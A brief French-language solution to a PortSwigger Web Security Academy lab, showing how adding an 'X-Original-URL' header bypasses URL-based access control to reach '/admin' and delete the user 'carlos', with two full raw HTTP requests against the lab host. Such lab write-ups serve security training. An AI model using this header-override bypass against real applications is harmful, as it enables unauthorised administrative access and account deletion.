# Lab

https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

## Solution

Quand on essaie d'accéder à `/admin` on a l'erreur : `Access denied`.

Si on modifie la requête pour ajouter le header `X-Original-URL: /admin` on a accès à la page d'admin :

```http
GET / HTTP/2
Host: 0ae8009903881d5c8beb738b00ea0021.web-security-academy.net
Cookie: session=E3foAjhzZk8kDsalE8cJdWubW1HcgsuZ
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Original-Url: /admin
```

Maintenant on peut supprimer le compte `carlos` avec la même technique :

```http
GET /?username=carlos HTTP/2
Host: 0ae8009903881d5c8beb738b00ea0021.web-security-academy.net
Cookie: session=E3foAjhzZk8kDsalE8cJdWubW1HcgsuZ
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Original-Url: /admin/delete
```